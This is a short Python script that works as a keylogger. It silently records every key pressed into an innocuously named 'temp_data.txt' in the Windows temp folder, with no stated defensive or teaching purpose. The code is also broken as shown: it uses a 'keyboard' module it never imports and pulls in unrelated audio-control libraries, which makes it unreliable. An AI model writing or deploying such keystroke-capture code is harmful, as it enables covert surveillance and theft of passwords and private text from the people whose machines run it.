import os
from ctypes import windll, CFUNCTYPE, c_int, POINTER, cast
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

def get_file_path():
    return os.path.join(os.getenv('TEMP'), 'temp_data.txt')

def on_press(key):
    try:
        with open(get_file_path(), 'a') as f:
            f.write(key.char)
    except AttributeError:
        with open(get_file_path(), 'a') as f:
            f.write(str(key))

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        pass